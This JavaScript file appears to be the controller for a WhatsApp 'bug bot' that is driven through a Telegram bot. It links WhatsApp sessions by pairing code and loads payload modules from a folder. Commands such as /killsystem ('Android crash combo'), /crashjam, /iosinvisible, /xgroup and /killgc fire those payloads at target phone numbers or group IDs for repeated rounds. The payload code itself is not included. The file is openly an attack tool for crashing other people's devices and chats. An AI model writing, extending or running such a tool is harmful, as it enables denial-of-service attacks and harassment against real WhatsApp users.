const fs = require('fs');
const path = require('path');
const pino = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  makeCacheableSignalKeyStore,
  DisconnectReason,
  Browsers
} = require('@whiskeysockets/baileys');

const config = require('./config');

const BOT_TOKEN = config.mainToken;
const ADMIN_ID  = String(config.adminId);
const AUTH_DIR  = path.join(__dirname, 'Love', 'auth');
const MOD_DIR   = path.join(__dirname, 'SY', 'S7');

const log = (m) => console.log(`[${new Date().toLocaleTimeString()}] ${m}`);

/* ---------- payload modules load ---------- */
const payloads = {};
for (const f of fs.readdirSync(MOD_DIR).filter(f => f.endsWith('.js'))) {
  try { Object.assign(payloads, require(path.join(MOD_DIR, f))); log(`module loaded: ${f}`); }
  catch (e) { log(`module FAILED: ${f} -> ${e.message}`); }
}

/* ---------- telegram bot ---------- */
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const send = (chatId, text) =>
  bot.sendMessage(chatId, text, { parse_mode: 'HTML', disable_web_page_preview: true });

const helpText = `⚡ <b>XeonTGbot Strong Build 2026</b>

<b>Session control:</b>
/add &lt;name&gt; &lt;number&gt;   — pair karo (pairing code milega)
/sessions            — sessions ki list
/use &lt;name&gt;         — active session set
/kill &lt;name&gt;         — session band
/status              — bot status + uptime
/listgc              — session ke groups (jid ke saath)

<b>Number payloads:</b>
/crashjam &lt;num&gt; [rounds]
/killsystem &lt;num&gt; [rounds]   ← Android crash combo
/crashfinity &lt;num&gt; [rounds]
/iosinvisible &lt;num&gt; [rounds]
/sticker &lt;num&gt; [rounds]

<b>Group payloads:</b>
/xgroup &lt;groupid&gt; [rounds]
/groupui &lt;groupid&gt; [rounds]
/killgc &lt;groupid&gt;
/groupfriz &lt;groupid&gt; [rounds]
/trashsysgp &lt;groupid&gt; [rounds]

Example:
/killsystem 923001234567 3
/xgroup 120363123456789-123456 30
`;

/* ---------- helpers ---------- */
const sessions = new Map();
let active = null;
const START_TIME = Date.now();

function jidOf(input) {
  let n = String(input).trim().replace(/[^0-9]/g, '');
  if (!n) return null;
  if (n.startsWith('0')) n = '92' + n.slice(1);
  return n.endsWith('@s.whatsapp.net') ? n : n + '@s.whatsapp.net';
}
function pickSession() {
  const name = active || [...sessions.keys()][0];
  return sessions.get(name) || null;
}
const isAdmin = (id) => String(id) === ADMIN_ID;

/* ---------- session connect ---------- */
async function addSession(name, number) {
  const dir = path.join(AUTH_DIR, name);
  fs.mkdirSync(dir, { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(dir);

  const sock = makeWASocket({
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
    },
    logger: pino({ level: 'silent' }),
    browser: Browsers.macOS('Desktop'),
    syncFullHistory: false,
    markOnlineOnConnect: false,
    generateHighQualityLinkPreview: false
  });

  const entry = { sock, saveCreds, status: 'connecting' };
  sessions.set(name, entry);
  if (!active) active = name;

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (u) => {
    const { connection, lastDisconnect } = u;
    if (connection === 'open') {
      entry.status = 'connected';
      log(`${name}: connected`);
    } else if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code === DisconnectReason.loggedOut) {
        entry.status = 'logged_out';
        log(`${name}: logged out — /add se dobara pair karo`);
      } else if (code === DisconnectReason.connectionReplaced) {
        entry.status = 'replaced';
        log(`${name}: phone par session replace hua`);
      } else {
        entry.status = 'reconnecting';
        log(`${name}: closed (${code}) — reconnect in 5s`);
        setTimeout(() => addSession(name, null), 5000);
      }
    }
  });

  if (!state.creds.registered) {
    if (!number) { entry.status = 'needs_pairing'; return null; }
    const code = await sock.requestPairingCode(number).catch(() => null);
    entry.status = 'awaiting_pairing';
    return code;
  }
  return null;
}

/* ---------- payload runner (timeout-protected) ---------- */
async function runPayload(chatId, pname, jid, opts = {}) {
  const e = pickSession();
  if (!e) return send(chatId, '❌ Koi session nahi. Pehle /add <name> <number>');
  if (e.status !== 'connected' && e.status !== 'reconnecting')
    return send(chatId, `❌ Session '${active}' status: ${e.status}`);
  const fn = payloads[pname];
  if (!fn) return send(chatId, `❌ Payload nahi mila: ${pname}\nAvailable: ${Object.keys(payloads).join(', ')}`);

  send(chatId, `🚀 /${pname} → ${jid} (session: ${active})`);
  const started = Date.now();
  try {
    await Promise.race([
      fn(e.sock, jid, opts),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout (10 min)')), 600000))
    ]);
    send(chatId, `✅ /${pname} complete → ${jid} (${((Date.now() - started) / 1000).toFixed(0)}s)`);
  } catch (err) {
    send(chatId, `❌ /${pname} error: ${err.message}`);
  }
}

/* ---------- telegram commands ---------- */
bot.onText(/\/start|\/help/, (m) => { if (isAdmin(m.chat.id)) send(m.chat.id, helpText); });

bot.onText(/\/add (\S+) (\S+)/, async (m, [_, name, number]) => {
  if (!isAdmin(m.chat.id)) return;
  if (sessions.has(name)) return send(m.chat.id, `Session '${name}' pehle se hai — /kill ${name} karo`);
  send(m.chat.id, `⏳ Pairing '${name}' → ${number} ...`);
  const code = await addSession(name, number);
  if (code)
    send(m.chat.id, `📲 <b>Pairing Code</b> (${name}):\n<code>${code}</code>\n\nWhatsApp → Linked Devices → Link a Device → code enter karo`);
  else
    send(m.chat.id, `✅ '${name}' connected (session already registered).`);
});

bot.onText(/\/use (\S+)/, (m, [_, name]) => {
  if (!isAdmin(m.chat.id)) return;
  if (!sessions.has(name)) return send(m.chat.id, `Session '${name}' nahi hai — /sessions`);
  active = name;
  send(m.chat.id, `Active session → ${name}`);
});

bot.onText(/\/sessions/, (m) => {
  if (!isAdmin(m.chat.id)) return;
  if (!sessions.size) return send(m.chat.id, 'Koi session nahi — /add <name> <number>');
  const lines = [...sessions.entries()]
    .map(([n, e]) => `${n} → ${e.status}${n === active ? ' ⭐' : ''}`);
  send(m.chat.id, '📂 Sessions:\n' + lines.join('\n'));
});

bot.onText(/\/status/, (m) => {
  if (!isAdmin(m.chat.id)) return;
  const up = Math.floor((Date.now() - START_TIME) / 1000);
  send(m.chat.id, `🤖 XeonTGbot Strong Build\nUptime: ${Math.floor(up / 60)}m ${up % 60}s\nSessions: ${sessions.size}\nPayloads: ${Object.keys(payloads).length}\nActive: ${active || 'none'}`);
});

bot.onText(/\/kill (\S+)/, (m, [_, name]) => {
  if (!isAdmin(m.chat.id)) return;
  const e = sessions.get(name);
  if (!e) return send(m.chat.id, `'${name}' nahi mila`);
  e.sock.end(new Error('killed by admin'));
  if (active === name) active = null;
  sessions.delete(name);
  send(m.chat.id, `Session '${name}' killed.`);
});

bot.onText(/\/listgc ?(\S*)/, async (m, [_, name]) => {
  if (!isAdmin(m.chat.id)) return;
  const e = sessions.get(name || active) || pickSession();
  if (!e) return send(m.chat.id, 'Koi session nahi');
  send(m.chat.id, '👥 Groups fetch ho rahe hain...');
  try {
    const groups = await e.sock.groupFetchAllParticipating();
    const lines = Object.entries(groups).map(([jid, g]) => `${g.subject} — ${jid}`);
    send(m.chat.id, `👥 Total ${lines.length}:\n` + lines.slice(0, 30).join('\n'));
  } catch (err) { send(m.chat.id, `❌ ${err.message}`); }
});

/* number payloads: /crashjam 92XXXXXXXXX [rounds] */
const NUM_PAYLOADS = ['crashjam', 'killsystem', 'crashfinity', 'sticker', 'iosinvisible'];
bot.onText(new RegExp(`^/(${NUM_PAYLOADS.join('|')}) (\\S+)(?: (\\d+))?$`), (m, match) => {
  if (!isAdmin(m.chat.id)) return;
  const [, pname, target, rounds] = match;
  const jid = jidOf(target);
  if (!jid) return send(m.chat.id, '❌ Number format galat — 923001234567');
  runPayload(m.chat.id, pname, jid, { rounds: rounds ? parseInt(rounds) : undefined });
});

/* group payloads: /xgroup 120363123456789-123456 [rounds] */
const GRP_PAYLOADS = ['xgroup', 'groupui', 'killgc', 'groupfriz', 'trashsysgp'];
bot.onText(new RegExp(`^/(${GRP_PAYLOADS.join('|')}) (\\S+)(?: (\\d+))?$`), (m, match) => {
  if (!isAdmin(m.chat.id)) return;
  const [, pname, target, rounds] = match;
  const jid = target.includes('@g.us') ? target : target + '@g.us';
  runPayload(m.chat.id, pname, jid, { rounds: rounds ? parseInt(rounds) : undefined });
});

/* ---------- startup ---------- */
(async () => {
  fs.mkdirSync(AUTH_DIR, { recursive: true });
  for (const name of fs.readdirSync(AUTH_DIR)) {
    if (fs.existsSync(path.join(AUTH_DIR, name, 'creds.json'))) {
      log(`restoring session: ${name}`);
      addSession(name, null);
    }
  }
  log(`✅ XeonTGbot started | payloads: ${Object.keys(payloads).join(', ')}`);
})();
